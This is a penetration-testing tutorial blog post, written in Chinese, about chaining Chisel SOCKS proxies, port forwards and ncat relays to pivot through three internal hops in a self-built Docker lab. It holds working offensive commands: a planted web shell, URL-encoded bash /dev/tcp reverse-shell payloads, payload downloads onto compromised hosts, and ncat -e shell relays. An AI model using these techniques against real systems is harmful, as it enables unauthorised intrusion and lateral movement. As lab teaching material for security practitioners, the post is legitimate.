---
title: "Double & Triple Pivoting and Proxychains using Chisel"
date: 2022-05-26T18:07:54+08:00
draft: false
url: "/2022/05/26/double-triple-pivoting-and-proxychains-using-chisel/"
categories:
  - 資訊安全
  - 滲透測試
showToc: true
TocOpen: false
---

最近遇到了一個非常極端的情境，需要在內網跳三層的 Tunneling， 而且這些機器們都沒有 SSH，這篇文會分享一下如何運用 Chisel 來跳多層的 Pivot。 雖然目前的 Cobalt Strike 以及 Meterpreter 都有相應的功能，不過本篇文章我希望使用最傳統，最基本的小工具來完成這個情境。

## 情境介紹

![](/uploads/2022/05/2022-05-26-16-52-48-1024x155.png)

我們的網路架構如上圖，我們在 Attacker 的機器，而我們需要攻擊的機器分別在不同的網段中，且互相摸不到對方。有三個目標：

1. 要能讓 Server A, B 及 C 摸到我們 Attacker:8000 身上的 Python HTTP Server
2. 要能在 Attacker 端，接收到 A, B 上面的 Reverse Shell
3. 要能透過 Proxychains 在 Attacker 上摸到、掃 Server A, B, C, D 的 TCP Port

我已經預先在 Server A, B 及 C 上擺放好了一句話的 Web Shell 方便操作

```
)
```

想要自己建立 Lab 的話，可以參考以下的 Github 連結： [Triple-Pivoting-Lab](https://github.com/stevenyu113228/Triple-Pivoting-Lab)

重點主要就是這個 Docker Compose 檔案，我們可以把每一顆 Container 都當作一台 Server 來完成以下的實驗。

```yaml
version: "3.8"

services:
  WebA:
    image: php:8-apache
    volumes:
      - ./WebA:/var/www/html
    networks:
      - internet
      - networkAB
    ports:
      - 7788:80
  WebB:
    image: php:8-apache
    volumes:
      - ./WebB:/var/www/html
    networks:
      - networkAB
      - networkBC
  WebC:
    image: php:8-apache
    volumes:
      - ./WebC:/var/www/html
    networks:
      - networkBC
      - networkCD
  WebD:
    image: php:8-apache
    volumes:
      - ./WebD:/var/www/html
    networks:
      - networkCD

networks:
  internet: {}
  networkAB:
    internal: true
  networkBC:
    internal: true
  networkCD:
    internal: true
```

## Section 1  - Attacker to Server A

在情境的目標 1 中，我們需要在 Attacker 機器中開啟一個 Python HTTP Server，在沒有占用的預設情境下，輸入以下指令會開啟 8000 Port。

```bash
python3 -m http.server
```

我們的 Attacker 機器跟 Server A 共用了紅色網段，他們摸的到對方，所以可以用超級簡單的方法收 Server 的 Reverse Shell。

```bash
# Attacker Terminal 1
rlwrap nc -nlvp 8001
```

```bash
# Attacker Terminal 2
curl '172.25.0.2?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.25.0.1%2F8001%200%3E%261%27'
```

到此，我們就可以順利在 Kali 機器上拿到一個 Server A 的 Reverse Shell。因為稍後會開非常多的 Port，為了避免混淆，我故意讓每個 Port Number 設定成不同的，以方便辨識。原則上同一台電腦不要開同一個 Port 就不會發生打架的問題。

電腦Port用途Attacker8000Python HTTP ServerAttacker8001接收 Server A 的 Reverse Shell

為了方便 Demo ，假設 A,B 及 C 機器中剛好都有 curl 可以用，我們可以直接用 Curl 來傳輸檔案，當然極端環境下也可以用 /dev/tcp 等方法來取代 curl。 我們的 Attacker 的資料夾中預備了 Chisel 以及 ncat 兩隻 Static Binary，可以方便的串接後續的功能。首先在 Server A 機器的 Reverse Shell 中下載 Chisel。

```bash
# Server A
curl 172.25.0.1:8000/chisel -o /tmp/chisel
chmod +x ./chisel
```

接下來分別在 Attacker 機器中開啟 Chisel Port

```bash
# Attacker
./chisel server -p 8002 --reverse
```

再於 Server A 上連接 Attacker 上的 Chisel，設定 Proxy 在 Attacker 的 8002 Port 上 。

```bash
# Server A
./chisel client 172.25.0.1:8002 R:8003:socks
```

到目前為止，我們開了 4 個 Pot 了，相關的列表如下所示

電腦Port用途Attacker8000Python HTTP ServerAttacker8001接收 Server A 的 Reverse ShellAttacker8002Chisel Server ListeningAttacker8003Chisel Proxy (Server A)

接下來我們就可以透過修改 Proxychains 的 Config 檔案，來使用 Proxychains ，在 Attacker 中藉由 Server A 機器摸到 Server B 機器。

```
# Attacker
# /etc/proxychains4.conf
socks5 127.0.0.1 8003
```

設定完畢後，我們就可以使用 Proxychains 在 Kali 摸到 Server B 機器，因為我懶得打字，所以提前先把 proxychains4 給 alias 成 pc。

```bash
# Attacker
alias pc=proxychains4
pc curl 172.26.0.2
```

## Section 2 - Server A to Server B

接下來我們要做的事情是，開始把 Port 向外推，準備攻陷 Server B。我們希望可以在 Server B 上訪問 Attacker:8000 的 Python HTTP Server ，所以接下來要反向的把 Attacker 機器的 Port 給轉到 Server A 身上。

```bash
# Server A
./chisel server -p 8004 --reverse
```

```bash
# Attacker
./chisel client 172.25.0.2:8004 R:8005:127.0.0.1:8000
```

透過以上兩行指令，我們可以在 Server A 開啟一個 Chisel Server，並把 Attacker 機器上的 8000 Port 給轉到 Server A 的 8004 Port。

電腦Port用途Attacker8000Python HTTP ServerAttacker8001接收 Server A 的 Reverse ShellAttacker8002Chisel Server ListeningAttacker8003Chisel Proxy (Server A)Server A8004Chisel Server ListingServer A8005Redirect Attacker:8000

到這邊為止， Server B 如果訪問 Server A :8005 即可吃到  Attacker 的 HTTP Server，我們接下來可以先在 Web A 上面部屬一隻 ncat， 先來測試一下 Reverse Shell 是否可以順利接到。

```bash
# Server A
curl 172.25.0.1:8000/ncat -o /tmp/ncat
chmod +x ./ncat

./ncat -nlvp 8006
```

```bash
# Attacker
pc curl '172.26.0.2/?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.26.0.3%2F8006%200%3E%261%27'
```

透過這個方法，我們可以順利在 Server A 上拿到 Server B 的 Reverse Shell，不過這不符合我們的目標，我們希望在 Attacker 上收到 Reverse Shell 才對，因此我們先把 Server A 的 ncat 關掉 (Ctrl + C)，重新來過。

先在 Attacker 機器上準備 8007 Port 的 ncat listener

```bash
# Attacker
rlwrap nc -nlvp 8007
```

再在 Server A 身上用 ncat 同時 Listing 8006 Port 準備收 Shell，且把結果吐給 Attacker 的 8007 Port

```bash
# Server A
./ncat 172.25.0.1 8007 -e './ncat -nlvp 8006'
```

再來，在 Attacker 機器上重新戳一次 Web Shell 升級 Reverse Shell 的指令，我們就能順利在 Attacker:8007 上收到來自 Server A 轉發的 Server B Reverse Shell 了。

```bash
# Attacker
pc curl '172.26.0.2/?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.26.0.3%2F8006%200%3E%261%27'
```

電腦Port用途Attacker8000Python HTTP ServerAttacker8001Receive Server A's  Reverse ShellAttacker8002Chisel Server ListeningAttacker8003Chisel Proxy (Server A)Server A8004Chisel Server ListingServer A8005Redirect Attacker:8000Server A8006Receive Server B's Reverse ShellAttacker8007Receive Server B's Reverse Shell From Server A:8006

接下來我們可以在 Server B 中部屬 ncat 以及 chisel，以利後續的動作進行。

```bash
# Server B
curl 172.26.0.3:8005/chisel64 -o /tmp/chisel
curl 172.26.0.3:8005/ncat64 -o /tmp/ncat
chmod +x ./chisel
chmod +x ./ncat
```

我們可以透過 chisel 設定一個 Server B 的 Proxy 在 Server A 的 8008 Port 上面，透過以下指令，因為 Chisel Server 一次可以不只接一個 Client，我們就重複利用上面已經開啟的 Chisel Port。

```bash
# Server B
./chisel client 172.26.0.3:8004 R:8008:socks
```

此時，在我們的 Attacker 機器上設定以下的 Proxychains，我們的網路封包首先會透過 127.0.0.1:8003 進入 Server A，再透過 Server A 身上的 8008 Port 作為 Proxychains，以 Server B 的身分往後連線。

```bash
# Attacker
# /etc/proxychains4.conf
socks5 127.0.0.1 8003 
socks5 127.0.0.1 8008
```

這個時候我們就可以直接在 Attacker 機器上，透過 Server A 跟 Server B 的 Proxy 串接，摸到 Server C，串了兩個 Proxy 才開始有 Chains 的感覺。

```bash
# Attacker
pc curl '172.27.0.2'
```

電腦Port用途Attacker8000Python HTTP ServerAttacker8001Reverse Shell (Server A)Attacker8002Chisel ServerAttacker8003Chisel Proxy (Server A)Server A8004Chisel ServerServer A8005Redirect Attacker:8000Server A8006Reverse Shell (Server B) - ListenerAttacker8007Reverse Shell (Server B)Server A8008Chisel Proxy (Server B)

## Section 3 - Server B to Server C

接下來我們要繼續的橫向移動，首先是需要把 Attacker:8000，也就是 Server A : 8005 給轉到 Server B 身上，這邊我們就需要先在 Server B 身上開一個 Chisel Server。

```bash
# Server B
./chisel server -p 8009 --reverse
```

再接下來，在 Server A 身上，執行 Chisel Client 的方法把 8005 Port 給丟到 Server B 身上的 8010 Port。

```bash
# Server A
./chisel client 172.26.0.2:8009 R:8010:127.0.0.1:8005
```

電腦Port用途Attacker8000Python HTTP ServerAttacker8001Reverse Shell (Server A)Attacker8002Chisel ServerAttacker8003Chisel Proxy (Server A)Server A8004Chisel ServerServer A8005Redirect Attacker's HTTP ServerServer A8006Reverse Shell (Server B) - ListenerAttacker8007Reverse Shell (Server B)Server A8008Chisel Proxy (Server B)Server B8009Chisel ServerServer B8010Redirect Attacker's HTTP Server (From A)

這樣的話，我們就可以順利在 Server C 中，透過摸 Server B : 8010 的方法來存取到 Attacker : 8000 的 HTTP Server。

再來的步驟，我們要設法把 Server C 的 Reverse Shell 給打到 Attacker 機器上，但不用貪心，我們一步一步慢慢來，先把 Reverse Shell 給從 Server C 打到 Server B 上就好。

```basic
# Server B
./ncat -nlvp 8011
```

```bash
# Attacker
pc -q curl '172.27.0.2/?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.27.0.3%2F8011%200%3E%261%27'
```

這樣我們就可以順利的，從 Server B 身上，收到 Server C 的 Reverse Shell。確定可以收到後，我們先把剛剛的 ncat 給關掉 (Ctrl + C)，再來我們試著一次打兩層，讓 Server C 的 Reverse Shell 從 Server A 身上收到。

```bash
# Server A
./ncat -nlvp 8012
```

```bash
# Server B
./ncat 172.26.0.3 8012 -e './ncat -nlvp 8011'
```

```bash
# Attacker
pc -q curl '172.27.0.2/?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.27.0.3%2F8011%200%3E%261%27'
```

很棒，到這邊為止，我們就能順利的在 Server A 身上收到 Server C 的 Reverse Shell 了！ 一樣先把上述的 Server A、 Server B 的 ncat 關掉，最後一步驟，我們需要依樣畫葫蘆的在 Attacker 身上收到 C 的 Reverse Shell。

```bash
# Attacker
rlwrap nc -nlvp 8013
```

```bash
# Server A
./ncat 172.25.0.1 8013 -e './ncat -nlvp 8012'
```

```bash
# Server B
./ncat 172.26.0.3 8012 -e './ncat -nlvp 8011'
```

```bash
# Attacker
pc -q curl '172.27.0.2/?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.27.0.3%2F8011%200%3E%261%27'
```

終於，我們順利的在 Attacker 機器上收到 Server C 的 Reverse Shell 了！

電腦Port用途Attacker8000Python HTTP ServerAttacker8001Reverse Shell (Server A)Attacker8002Chisel ServerAttacker8003Chisel Proxy (Server A)Server A8004Chisel ServerServer A8005Redirect Attacker's HTTP ServerServer A8006Reverse Shell (Server B) - ListenerAttacker8007Reverse Shell (Server B)Server A8008Chisel Proxy (Server B)Server B8009Chisel ServerServer B8010Redirect Attacker's HTTP Server (From A)Server B8011Reverse Shell (Server C) - ListenerServer A8012Reverse Shell (Server C) - Listener (From B)Attacker8013Reverse Shell (Server C)

## Section 4 - Server C to Server D

跟前面一樣，先部屬 Chisel，可以直接拿 Server B : 8010 上面的檔案。

```basic
# Server C
curl 172.27.0.3:8010/chisel64 -o /tmp/chisel
chmod +x ./chisel
```

我們的目標是希望透過 Proxychains 摸到 Server D，因此要在 Server C 身上開一個 Proxy Port，並打到 Server B 身上。

```bash
# Server C
./chisel client 172.27.0.3:8009 R:8014:socks
```

跟上面一樣，我們能共用 Server B 本來就已經開好的 Chisel Server ，把 C 的 Proxy 給放在 B 身上。

電腦Port用途Attacker8000Python HTTP ServerAttacker8001Reverse Shell (Server A)Attacker8002Chisel ServerAttacker8003Chisel Proxy (Server A)Server A8004Chisel ServerServer A8005Redirect Attacker's HTTP ServerServer A8006Reverse Shell (Server B) - ListenerAttacker8007Reverse Shell (Server B)Server A8008Chisel Proxy (Server B)Server B8009Chisel ServerServer B8010Redirect Attacker's HTTP Server (From A)Server B8011Reverse Shell (Server C) - ListenerServer A8012Reverse Shell (Server C) - Listener (From B)Attacker8013Reverse Shell (Server C)Server B8014Chisel Proxy (Server C)

接下來設定 Attacker 身上的 Proxychains config 檔案

```
# Attacker
# /etc/proxychains4.conf
socks5 127.0.0.1 8003
socks5 127.0.0.1 8008
socks5 127.0.0.1 8014
```

由上而下，分別代表先後順序，我們的 Request 會先透過 Attacker 身上的 127.0.0.1:8003， Proxy 到 Server A 身上，接下來用 Server A 身上的 127.0.0.1:8008 轉到 Server B 身上，最後用 Server C 身上的 127.0.0.1:8014 跑到 Server C。 接下來我們的 Proxychains 就都可以用 Server C 的身分出去做事了。

![](/uploads/2022/05/iXsrTkm-1024x141.png)

當然，如果想要讓 C 身上打一個 Reverse Shell，或是要把 Attacker 的 8000 給轉到 C 身上，也就繼續的重複使用前面的方法即可。 覺得 Pivoting 滿好玩的，Chisel 跟 ncat 也都是超神的工具，只要掌握了以上的技巧，真的要 Pivot 100 層也都不會是問題。
